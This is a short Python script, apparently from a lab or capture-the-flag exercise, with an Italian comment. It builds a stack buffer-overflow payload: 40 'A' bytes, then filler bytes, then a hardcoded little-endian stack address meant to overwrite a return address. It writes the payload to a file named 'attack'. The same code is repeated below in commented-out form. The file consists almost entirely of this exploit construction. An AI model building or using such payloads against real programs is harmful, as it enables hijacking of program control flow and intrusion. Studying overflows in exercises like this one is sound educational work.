buf_size = 40 

out = bytearray() 

for x in range(buf_size):
	out += b'\x41'
out += b'BBBBBBBBCCCCCCCC' 

#voglio metterci: 0x 00 00 7f ff ff ff e3 58 scritto al contrario per endianness 
out += b'\x58\xe3\xff\xff\xff\x7f\x00\x00'

# out += b'DDDDDDDD'

f = open("attack", "wb")
f.write(out)
f.close()

print("Ok")

# buf_size = 40 

# out = bytearray() 



# for x in range(buf_size):
# 	out += b'\x41'
# out += b'BBBBBBBBCCCCCCCC' 

# #voglio metterci: 0x 00 00 7f ff ff ff e3 58 scritto al contrario per endianness 
# out += b'\x58\xe3\xff\xff\xff\x7f\x00\x00'

# # out += b'DDDDDDDD'

# f = open("attack", "wb")
# f.write(out)
# f.close()

# print("Ok")



